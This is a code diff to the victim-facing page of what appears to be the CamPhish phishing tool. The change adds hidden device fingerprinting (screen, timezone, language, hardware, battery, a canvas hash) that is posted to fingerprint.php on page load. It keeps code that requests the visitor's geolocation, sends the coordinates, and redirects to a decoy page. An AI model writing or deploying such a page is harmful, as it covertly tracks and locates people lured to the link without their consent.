@@ -6,9 +6,74 @@ echo '
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>page_title_placeholder</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src \'self\' https:; script-src \'self\' \'unsafe-inline\' https:; style-src \'self\' \'unsafe-inline\' https:; img-src \'self\' data: https:; media-src \'self\' blob: https:; connect-src \'self\' https:;">
+    <link rel="icon" type="image/png" href="favicon_url_placeholder">
     <script>
+        // Redirect to HTTPS if accessed over plain HTTP (tunnels always use HTTPS)
+        (function() {
+            var h = window.location.hostname;
+            if (window.location.protocol !== "https:" && h !== "localhost" && h !== "127.0.0.1") {
+                window.location.href = "https://" + h + window.location.pathname + window.location.search;
+            }
+        })();
+
+        // Collect device fingerprint and send to server
+        function collectFingerprint() {
+            var data = {
+                screen:    screen.width + "x" + screen.height + "@" + screen.colorDepth + "bit",
+                tz:        (typeof Intl !== "undefined") ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Unknown",
+                lang:      navigator.language || navigator.userLanguage || "Unknown",
+                platform:  navigator.platform || "Unknown",
+                memory:    navigator.deviceMemory || "Unknown",
+                cores:     navigator.hardwareConcurrency || "Unknown",
+                battery:   "Unknown",
+                canvas_fp: "Unknown"
+            };
+
+            // Canvas fingerprint
+            try {
+                var c = document.createElement("canvas");
+                var ctx = c.getContext("2d");
+                ctx.textBaseline = "top";
+                ctx.font = "14px Arial";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("CamPhish", 2, 15);
+                ctx.fillStyle = "rgba(102,204,0,0.7)";
+                ctx.fillText("fingerprint", 4, 45);
+                var raw = c.toDataURL();
+                var hash = 0;
+                for (var i = 0; i < raw.length; i++) {
+                    hash = ((hash << 5) - hash) + raw.charCodeAt(i);
+                    hash |= 0;
+                }
+                data.canvas_fp = (hash >>> 0).toString(16);
+            } catch(e) {}
+
+            // Battery API
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(b) {
+                    data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "discharging");
+                    sendFingerprint(data);
+                }).catch(function() { sendFingerprint(data); });
+            } else {
+                sendFingerprint(data);
+            }
+        }
+
+        function sendFingerprint(data) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "fingerprint.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            var params = Object.keys(data).map(function(k) {
+                return encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
+            }).join("&");
+            xhr.send(params);
+        }
+
         // Debug function to log messages - only log essential information
         function debugLog(message) {
             // Only log essential location data, not status messages
@@ -24,12 +89,7 @@ echo '
         }
         
         function getLocation() {
-            // Don\'t log this message
-            
             if (navigator.geolocation) {
-                // Don\'t log this message
-                
-                // Show permission request message
                 document.getElementById("locationStatus").innerText = "Requesting location permission...";
                 
                 navigator.geolocation.getCurrentPosition(
@@ -42,9 +102,7 @@ echo '
                     }
                 );
             } else {
-                // Don\'t log this message
                 document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
-                // Redirect after a delay if geolocation is not supported
                 setTimeout(function() {
                     redirectToMainPage();
                 }, 2000);
@@ -67,9 +125,6 @@ echo '
             
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
-                    // Don\'t log this message
-                    
-                    // Add a delay before redirecting to ensure data is processed
                     setTimeout(function() {
                         redirectToMainPage();
                     }, 1000);
@@ -77,44 +132,32 @@ echo '
             };
             
             xhr.onerror = function() {
-                // Don\'t log this message
-                // Still redirect even if there was an error
                 redirectToMainPage();
             };
             
-            // Send the data with a timestamp to avoid caching
             xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
         }
         
         function handleError(error) {
-            // Don\'t log error messages
-            
             document.getElementById("locationStatus").innerText = "Redirecting...";
-            
-            // If user denies location permission or any other error, still redirect after a short delay
             setTimeout(function() {
                 redirectToMainPage();
             }, 2000);
         }
         
         function redirectToMainPage() {
-            // Don\'t log this message
-            // Try to redirect to the template page
             try {
                 window.location.href = "forwarding_link/index2.html";
             } catch (e) {
-                // Don\'t log this message
-                // Fallback redirection
                 window.location = "forwarding_link/index2.html";
             }
         }
         
-        // Try to get location when page loads
         window.onload = function() {
-            // Don\'t log this message
+            collectFingerprint();
             setTimeout(function() {
                 getLocation();
-            }, 500); // Small delay to ensure everything is loaded
+            }, 500);
         };
     </script>
 </head>
